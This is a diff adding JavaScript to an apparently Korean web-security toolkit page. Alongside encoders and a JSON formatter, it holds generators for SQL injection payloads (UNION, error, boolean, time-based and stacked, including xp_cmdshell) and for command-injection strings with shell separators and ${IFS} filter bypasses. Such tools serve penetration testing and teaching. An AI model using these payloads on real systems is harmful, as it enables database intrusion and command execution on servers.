+                        payloads.push(`' UNION SELECT ${nulls} ${comment}`);
+                        payloads.push(`' UNION SELECT sqlite_version(),NULL,NULL ${comment}`);
+                        break;
+                }
+            } else if (type === 'error') {
+                switch(dbms) {
+                    case 'mysql':
+                        payloads.push(`' AND extractvalue(1,concat(0x7e,(SELECT user()),0x7e)) ${comment}`);
+                        payloads.push(`' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) ${comment}`);
+                        break;
+                    case 'mssql':
+                        payloads.push(`' AND 1=CONVERT(int,(SELECT @@version)) ${comment}`);
+                        break;
+                    case 'oracle':
+                        payloads.push(`' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual)) ${comment}`);
+                        break;
+                    case 'postgresql':
+                        payloads.push(`' AND 1=CAST((SELECT version()) AS int) ${comment}`);
+                        break;
+                }
+            } else if (type === 'boolean') {
+                payloads.push(`' AND 1=1 ${comment}`);
+                payloads.push(`' AND 1=2 ${comment}`);
+                if (dbms === 'mysql') {
+                    payloads.push(`' AND SUBSTRING(user(),1,1)='r' ${comment}`);
+                    payloads.push(`' AND ASCII(SUBSTRING(database(),1,1))>97 ${comment}`);
+                }
+            } else if (type === 'time') {
+                switch(dbms) {
+                    case 'mysql':
+                        payloads.push(`' AND SLEEP(5) ${comment}`);
+                        payloads.push(`' AND IF(1=1,SLEEP(5),0) ${comment}`);
+                        break;
+                    case 'mssql':
+                        payloads.push(`'; WAITFOR DELAY '00:00:05' ${comment}`);
+                        break;
+                    case 'oracle':
+                        payloads.push(`' AND DBMS_LOCK.SLEEP(5) ${comment}`);
+                        break;
+                    case 'postgresql':
+                        payloads.push(`' AND pg_sleep(5) ${comment}`);
+                        break;
+                }
+            } else if (type === 'stacked') {
+                switch(dbms) {
+                    case 'mysql':
+                        payloads.push(`'; SELECT SLEEP(5) ${comment}`);
+                        break;
+                    case 'mssql':
+                        payloads.push(`'; EXEC xp_cmdshell('whoami') ${comment}`);
+                        break;
+                    case 'postgresql':
+                        payloads.push(`'; SELECT pg_sleep(5) ${comment}`);
+                        break;
+                }
+            }
+
+            
+
+            let html = '<div style="font-family: monospace; font-size: 14px;">';
+            html += `<div style="background: var(--color-primary); color: white; padding: 8px; border-radius: 4px; margin-bottom: 12px; font-weight: bold;">
+                ${dbms.toUpperCase()} - ${type.toUpperCase()} 
+            </div>`;
+
+            payloads.forEach((payload, idx) => {
+                html += `<div style="background: var(--color-surface); padding: 12px; margin-bottom: 8px; border-radius: 4px; cursor: pointer;" 
+                         data-onclick="navigator.clipboard.writeText(this.querySelector('code').textContent); alert('복사되었습니다!');">
+                    <div style="color: var(--color-text-secondary); font-size: 12px; margin-bottom: 4px;">Payload #${idx + 1}</div>
+                    <code style="color: var(--color-primary); word-break: break-all;">${escapeHtml(payload)}</code>
+                </div>`;
+            });
+            html += '</div>';
+
+            output.innerHTML = html;
+            result.style.display = 'block';
+        }
+
+        // Command Injection Generator
+        function generateCMDi() {
+            const os = document.getElementById('cmdi-os').value;
+            const command = document.getElementById('cmdi-command').value;
+            const separator = document.getElementById('cmdi-separator').value;
+            const spaceBypass = document.getElementById('cmdi-space-bypass').checked;
+
+            const output = document.getElementById('cmdi-output');
+            const result = document.getElementById('cmdi-result');
+
+            if (!command) {
+                alert('명령어를 입력해주세요.');
+                return;
+            }
+
+            let payloads = [];
+            let cmd = command;
+
+            if (spaceBypass && os === 'linux') {
+                cmd = command.replace(/ /g, '${IFS}');
+            }
+
+            const separators = [];
+            if (os === 'linux') {
+                if (separator === 'all' || separator === 'semicolon') separators.push({ name: '세미콜론', sep: ';' });
+                if (separator === 'all' || separator === 'pipe') separators.push({ name: '파이프', sep: '|' });
+                if (separator === 'all' || separator === 'and') separators.push({ name: 'AND', sep: '&&' });
+                if (separator === 'all' || separator === 'or') separators.push({ name: 'OR', sep: '||' });
+                if (separator === 'all' || separator === 'backtick') separators.push({ name: '백틱', sep: '`', wrapper: true });
+                if (separator === 'all' || separator === 'dollar') separators.push({ name: '$()', sep: '$(', suffix: ')' });
+            } else {
+                if (separator === 'all' || separator === 'pipe') separators.push({ name: '파이프', sep: '|' });
+                if (separator === 'all' || separator === 'and') separators.push({ name: 'AND', sep: '&' });
+            }
+
+            separators.forEach(s => {
+                if (s.wrapper) {
+                    payloads.push({ name: s.name, payload: s.sep + cmd + s.sep });
+                } else if (s.suffix) {
+                    payloads.push({ name: s.name, payload: s.sep + cmd + s.suffix });
+                } else {
+                    payloads.push({ name: `앞에 삽입 (${s.name})`, payload: 'test' + s.sep + cmd });
+                    payloads.push({ name: `뒤에 삽입 (${s.name})`, payload: cmd + s.sep + 'test' });
+                }
+            });
+
+            if (spaceBypass && os === 'linux') {
+                payloads.push({ name: '$IFS$9 사용', payload: command.replace(/ /g, '$IFS$9') });
+                payloads.push({ name: 'Tab 사용', payload: command.replace(/ /g, '\t') });
+            }
+
+            let html = '<div style="font-family: monospace; font-size: 14px;">';
+            html += `<div style="background: var(--color-primary); color: white; padding: 8px; border-radius: 4px; margin-bottom: 12px; font-weight: bold;">
+                ${os.toUpperCase()} Command Injection
+            </div>`;
+
+            payloads.forEach(p => {
+                html += `<div style="background: var(--color-surface); padding: 12px; margin-bottom: 8px; border-radius: 4px; cursor: pointer;" 
+                         data-onclick="navigator.clipboard.writeText(this.querySelector('code').textContent); alert('복사되었습니다!');">
+                    <div style="color: var(--color-text-secondary); font-size: 12px; margin-bottom: 4px;">${p.name}</div>
+                    <code style="color: var(--color-teal-500); word-break: break-all;">${escapeHtml(p.payload)}</code>
+                </div>`;
+            });
+            html += '</div>';
+
+            output.innerHTML = html;
+            result.style.display = 'block';
+        }
+
+    
+        // JSON Formatter Logic
+        function processJson(mode) {
+            const input = document.getElementById('json-input').value;
+            const output = document.getElementById('json-output');
+
+            if (!input.trim()) { 
+                output.value = ''; 
+                return; 
+            }
+
+            try {
+                const obj = JSON.parse(input);
+                if (mode === 'minify') {
+                    output.value = JSON.stringify(obj);
+                } else {
+                    output.value = JSON.stringify(obj, null, 4);
+                }
+            } catch (e) {
+                output.value = "유효하지 않은 JSON입니다:\n" + e.message;
+            }
+        }
+
+        setupRealtimeConversion('json-input', 'json-realtime', () => processJson('beautify'));
+
+        /**
+         * 안전하게 HTML을 렌더링 (XSS 방어)
+         */
+        function safeSetHTML(container, htmlString) {
+            if (!htmlString || htmlString.trim() === '') {
+                container.textContent = '';
+                return;
+            }
+
+            const tempDiv = document.createElement('div');
+            tempDiv.innerHTML = htmlString;
+
+            const scripts = tempDiv.querySelectorAll('script');
+            scripts.forEach(s => s.remove());
+
+            const allElements = tempDiv.querySelectorAll('*');
+            allElements.forEach(el => {
+                Array.from(el.attributes).forEach(attr => {
+                    if (attr.name.startsWith('on')) {
+                        el.removeAttribute(attr.name);
+                    }
+                });
+            });
+
+            container.textContent = '';
+            while (tempDiv.firstChild) {
+                container.appendChild(tempDiv.firstChild);
+            }
+        }
+
+        function createSafeElement(tag, text, className = '') {
+            const element = document.createElement(tag);
+            element.textContent = text;
+            if (className) element.className = className;
+            return element;
+        }
+
+
+        // ========== 이벤트 리스너 초기화 (XSS 방어) ==========
+        function initializeEventListeners() {
+            document.querySelectorAll('[data-action]').forEach(element => {
+                element.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    const action = this.getAttribute('data-action');
+
+                    switch(action) {
+                        case 'clear':
+                            const inputId = this.getAttribute('data-input');
+                            const outputId = this.getAttribute('data-output');
+                            if (inputId && outputId) clearText(inputId, outputId);
+                            break;
+                        case 'copy':
+                            const targetId = this.getAttribute('data-target');
+                            if (targetId) copyText(targetId);
+                            break;
+                        case 'swap':
+                            const swapInput = this.getAttribute('data-input');
+                            const swapOutput = this.getAttribute('data-output');
+                            if (swapInput && swapOutput) swapText(swapInput, swapOutput);
+                            break;
+                        case 'autoConvertBase64': autoConvertBase64(); break;
+                        case 'encodeBase64': encodeBase64(); break;
+                        case 'decodeBase64': decodeBase64(); break;
+                        case 'autoConvertURL': autoConvertURL(); break;
+                        case 'encodeURL': encodeURL(); break;
+                        case 'decodeURL': decodeURL(); break;
+                        case 'encodeDoubleURL': encodeDoubleURL(); break;
+                        case 'decodeDoubleURL': decodeDoubleURL(); break;
+                        case 'autoConvertHTML': autoConvertHTML(); break;
+                        case 'encodeHTML': encodeHTML(); break;
+                        case 'decodeHTML': decodeHTML(); break;
+                        case 'autoConvertHex': autoConvertHex(); break;
+                        case 'encodeHex': encodeHex(); break;
+                        case 'decodeHex': decodeHex(); break;
+                        case 'autoConvertUnicode': autoConvertUnicode(); break;
+                        case 'encodeUnicode': encodeUnicode(); break;
+                        case 'decodeUnicode': decodeUnicode(); break;
+                        case 'decodeJWT': decodeJWT(); break;
+                        case 'generateAllHashes': generateAllHashes(); break;
+                        case 'smartDetect': smartDetect(); break;
+                        case 'savePreset': savePreset(); break;
+                        case 'loadPresets': loadPresets(); break;
+                        case 'generateSQLi': generateSQLi(); break;
+                        case 'generateCMDi': generateCMDi(); break;
+                                            }
+                });
+            });
+
+            document.querySelectorAll('[data-onclick]').forEach(element => {
+                element.addEventListener('click', function(e) {
+                    const handler = this.getAttribute('data-onclick');
+                    try {
+                        const funcMatch = handler.match(/([a-zA-Z0-9_]+)\((.*)\)/);
+                        if (funcMatch && typeof window[funcMatch[1]] === 'function') {
+                            const args = funcMatch[2].split(',').map(arg => arg.trim().replace(/['"]/g, ''));
+                            window[funcMatch[1]].apply(null, args);
+                        }
+                    } catch (error) {
+                        console.error('Event handler error:', error);
+                    }
+                });
+            });
+        }
+
+        if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', initializeEventListeners);
+        } else {
+            initializeEventListeners();
+        }
+
+    
+        // Cheat Sheet 복사 함수
+        function copyCheat(button) {
+            const codeElement = button.previousElementSibling;
+            const text = codeElement.textContent;
+
+            navigator.clipboard.writeText(text).then(() => {
+                const originalText = button.textContent;
+                button.textContent = '✅';
+                button.style.background = 'var(--color-success)';
+                button.style.color = 'white';
+
+                setTimeout(() => {
+                    button.textContent = originalText;
+                    button.style.background = '';
+                    button.style.color = '';
+                }, 1500);
+            }).catch(err => {
+                console.error('복사 실패:', err);
+                // Fallback for older browsers
+                const textarea = document.createElement('textarea');
+                textarea.value = text;
+                textarea.style.position = 'fixed';
+                textarea.style.opacity = '0';
+                document.body.appendChild(textarea);
+                textarea.select();
+                try {
+                    document.execCommand('copy');
+                    button.textContent = '✅';
+                    setTimeout(() => button.textContent = '📋', 1500);
+                } catch (e) {
+                    console.error('Fallback 복사도 실패:', e);
+                    button.textContent = '❌';
+                    setTimeout(() => button.textContent = '📋', 1500);
+                }
+                document.body.removeChild(textarea);
+            });
+        }
+
+    
+        // ===== 2. SQL Injection 필터 함수 (올바른 버전만 유지) =====
+        function filterSQLi() {
+            const filter = document.getElementById('sqli-filter').value;
+            const categories = document.querySelectorAll('#sqli-cheatsheet .cheat-category');
+            
+            categories.forEach(category => {
+                const dbms = category.getAttribute('data-dbms');
+                if (filter === 'all' || filter === dbms) {
+                    category.style.display = 'block';
+                } else {
+                    category.style.display = 'none';  // ← 추가!
+                }
+            });
+        }
+
+        // ===== 3. Command Injection 필터 함수 (올바른 버전만 유지) =====
+        function filterCmdI() {
+            const filter = document.getElementById('cmdi-filter').value;
+            const categories = document.querySelectorAll('#cmdi-cheatsheet .cheat-category');
+
+            categories.forEach(category => {
+                const os = category.getAttribute('data-os');
+                if (filter === 'all' || filter === os) {
+                    category.style.display = 'block';
+                } else {
+                    category.style.display = 'none';
+                }
+            });
+        }
+    
+    
+    
+        // XSS 방지를 위한 HTML 이스케이프 함수
+        function escapeHtml(unsafe) {
+            if (typeof unsafe !== 'string') return unsafe;
+            return unsafe
+                .replace(/&/g, "&amp;")
+                .replace(/</g, "&lt;")
+                .replace(/>/g, "&gt;")
+                .replace(/"/g, "&quot;")
+                .replace(/'/g, "&#039;");
+        }
+    
+
     </script>
 </body>
 </html>
